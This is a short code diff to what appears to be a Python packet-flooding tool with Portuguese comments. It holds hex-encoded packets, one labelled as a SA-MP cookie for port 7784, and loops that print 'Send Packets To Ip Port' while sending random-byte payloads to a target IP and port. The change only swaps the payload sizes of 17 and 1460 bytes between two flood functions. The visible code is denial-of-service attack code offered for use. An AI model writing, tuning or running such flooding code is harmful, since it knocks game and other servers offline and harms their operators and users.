@@ -59,7 +59,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                        ]
 def run():
-	data = random._urandom(1460)
+	data = random._urandom(17)
 	i = random.choice(("[•]","[!]","[•]"))
 	while True:
 		try:
@@ -120,7 +120,7 @@ def run4():
 			print("\u001b[31m[•] ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
 			
 def run5():
-	data = random._urandom(17)
+	data = random._urandom(1460)
 	i = random.choice(("[+]","[!]","[•]"))
 	while True:
 		try:
